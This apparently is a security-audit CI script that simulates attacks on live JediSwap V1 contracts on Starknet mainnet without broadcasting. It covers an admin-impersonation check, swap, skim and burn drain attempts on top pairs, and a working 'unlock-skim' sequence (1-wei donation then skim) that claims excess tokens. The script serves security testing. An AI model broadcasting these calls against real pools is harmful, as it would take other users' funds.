#!/usr/bin/env python3
"""CI simulations for JediSwap V1 (read-only starknet_call / starknet_simulateTransactions).
Nothing is broadcast.
Writes ci-out/ci_sims.json
"""
import json, os, sys, time, urllib.request, urllib.error
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import sn

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ci-out")
os.makedirs(OUT, exist_ok=True)
RPC = "https://api.cartridge.gg/x/starknet/mainnet"

ADMIN = "0x284a1ad6382cffc520d8f711cf9519ccf43b3c105b89ef081cbe1a625322410"
FACT = "0xdad44c139a476c7a17fc8141e6db680e9abc9f56fe249a105094c44382c2fd"
SENDERS = ["0x2b9d17a44a0f747b6374ee5ea9fb1c2acdb1825adb0a1dd905b756617827ff9",
           "0x49e505eaf9fa33d61f472c6197ae602f92844f500b1a733d6d8e2fb4aa68291",
           "0x4678eb497e96599c92b45f342c2bd284321fe219c60a9b6293d80f0fbfa61b5"]

# top pairs by value (from local deep-dive; re-read live state below anyway)
TOP_PAIRS = [
    "0x4d0390b777b424e43839cd1e744799f3de6c176c7e32c1812a41dbd9c19db6a",  # ETH/USDC
    "0x45e7131d776dddc137e30bdd490b431c7144677e97bf9369f629ed8d3fb7dd6",  # ETH/USDT
    "0x7e2a13b40fc1119ec55e0bcf9428eedaa581ab3c924561ad4e955f95da63138",  # ETH/WBTC
    "0x5801bdad32f343035fb242e98d1e9371ae85bc1543962fedea16c59b35bd19b",
]
EXCESS_PAIR = "0x239ea23c8b19aa8fd275c2cfd146aa5a6ad50c22d738f5100b4df38d9e12ab9"  # STARKY dust excess

results = {"generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}


def rpc_raw(method, params, tries=4):
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    last = None
    for i in range(tries):
        try:
            req = urllib.request.Request(RPC, data=json.dumps(payload).encode(),
                                         headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=120) as r:
                return json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            try:
                return json.loads(e.read().decode())
            except Exception as ex:
                last = str(ex)
        except Exception as e:
            last = str(e)
        time.sleep(1.5 * (i + 1))
    return {"error": {"message": f"rpc failed: {last}"}}


def sim_invoke(inner_calls, sender_override=None):
    """inner_calls: list of [to, selector, calldata_list]; wrapped into account __execute__."""
    calldata = [len(inner_calls)]
    for to, sel, cd in inner_calls:
        calldata += [int(to, 16), int(sel, 16), len(cd)] + [int(x) for x in cd]
    last = None
    for attempt in range(6):
        sender = sender_override or SENDERS[attempt % len(SENDERS)]
        n = rpc_raw("starknet_getNonce", ["latest", sender])
        if "result" not in n:
            last = n; continue
        nonce = int(n["result"], 16)
        tx = {"type": "INVOKE", "version": "0x1", "sender_address": sender,
              "calldata": [hex(x) for x in calldata], "signature": [], "nonce": hex(nonce), "max_fee": "0x0"}
        resp = rpc_raw("starknet_simulateTransactions", {
            "block_id": "latest", "transactions": [tx],
            "simulation_flags": ["SKIP_VALIDATE", "SKIP_FEE_CHARGE"]})
        if "result" in resp:
            tr = resp["result"][0]["transaction_trace"]["execute_invocation"]
            if "revert_reason" in tr:
                lines = [l.strip() for l in tr["revert_reason"].split("\n") if l.strip()]
                return {"status": "REVERT", "detail": lines[-1][:300], "sender": sender}
            return {"status": "SUCCESS", "detail": json.dumps(tr.get("result"))[:200], "sender": sender}
        msg = json.dumps(resp.get("error", {}))[:200]
        if "nonce" in msg:
            last = msg; time.sleep(1); continue
        return {"status": "ERR", "detail": msg, "sender": sender}
    return {"status": "ERR", "detail": str(last)[:200], "sender": None}


def call_pair(pair, func, args):
    payload = {"jsonrpc": "2.0", "id": 1, "method": "starknet_call", "params": {"request": {
        "contract_address": hex(int(pair, 16)), "entry_point_selector": sn.selector(func),
        "calldata": [hex(x) for x in args]}, "block_id": "latest"}}
    d = rpc_raw("starknet_call", payload["params"])
    if "result" in d:
        return {"status": "SUCCESS", "result": json.dumps(d["result"])[:120]}
    err = d.get("error", {})
    rr = err.get("data", {}).get("revert_error", {})
    while isinstance(rr, dict) and "error" in rr:
        rr = rr["error"]
    if isinstance(rr, dict):
        rr = rr.get("error") or json.dumps(rr)[:200]
    if isinstance(rr, str) and rr.startswith("0x"):
        try:
            b = bytes.fromhex(rr[2:]); s = b.decode("utf-8", "ignore")
            if s and all(32 <= ord(c) < 127 for c in s): rr = f"{rr} ('{s}')"
        except Exception:
            pass
    return {"status": "REVERT", "detail": str(rr)[:250]}


attacker = int(SENDERS[0], 16)
exec_sel = sn.selector("__execute__")
get_admin_sel = sn.selector("get_admin")

# --- 1) control: admin itself executes factory.get_admin (privileged path works) ---
ctrl = sim_invoke([[FACT, get_admin_sel, []]], sender_override=ADMIN)
# --- 2) third party tries to make admin execute (would allow proxy.upgrade) ---
inner = [1, int(FACT, 16), int(get_admin_sel, 16), 0]
third = sim_invoke([[ADMIN, exec_sel, inner]])
results["admin_execute_control"] = ctrl
results["admin_execute_third_party"] = third
print("control:", ctrl["status"], ctrl["detail"][:80], flush=True)
print("third-party:", third["status"], third["detail"][:120], flush=True)

# --- 3) drain attempts on top pairs (read-only starknet_call) ---
drains = []
for p in TOP_PAIRS:
    rr = sn.call(p, "get_reserves")
    r0 = int(rr[0], 16) + (int(rr[1], 16) << 128)
    if r0 > 1:
        x = r0 - 1
        drains.append({"pair": p, "attempt": "swap_out_reserve-1_no_input",
                       **call_pair(p, "swap", [x & ((1 << 128) - 1), x >> 128, 0, 0, attacker, 0, 0])})
    drains.append({"pair": p, "attempt": "swap_out_ge_reserve",
                   **call_pair(p, "swap", [r0 & ((1 << 128) - 1), r0 >> 128, 0, 0, attacker, 0, 0])})
    drains.append({"pair": p, "attempt": "skim_no_excess", **call_pair(p, "skim", [attacker])})
    drains.append({"pair": p, "attempt": "burn_zero_lp", **call_pair(p, "burn", [attacker])})
    print(p[:14], "drains done", flush=True)

# --- 4) skim on the one pair with (dust) excess: succeeds, but only unpriced dust ---
skim_excess = {"pair": EXCESS_PAIR, "attempt": "skim_dust_excess",
               **call_pair(EXCESS_PAIR, "skim", [attacker])}
results["drain_attempts"] = drains
results["skim_dust_excess"] = skim_excess
print("skim dust:", skim_excess["status"], str(skim_excess.get("detail", ""))[:100], flush=True)

# --- 5) unlock-skim: single-sided excess can be claimed after a 1-wei donation to the
#        other side (skim uses strict checked_sub_lt on both legs). Proven by simulation. ---
ETH = "0x49d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7"
unlock = []
for pair, note in [(EXCESS_PAIR, "STARKY excess 1.478e29 (unpriced meme)"),
                   ("0x3b6963dfd88f079a69eeb41734d8e1d4eaedf2b029f8cec795dfffb6b4c9985",
                    "TEST excess 1.1e21 (unpriced test token)")]:
    r = sim_invoke([[ETH, sn.selector("transfer"), [int(pair, 16), 1, 0]],
                    [pair, sn.selector("skim"), [attacker]]])
    r["pair"] = pair
    r["note"] = note
    unlock.append(r)
    print("unlock-skim", pair[:14], "->", r["status"], r["detail"][:120], flush=True)
results["unlock_skim"] = unlock

json.dump(results, open(os.path.join(OUT, "ci_sims.json"), "w"), indent=1)
print("DONE", flush=True)
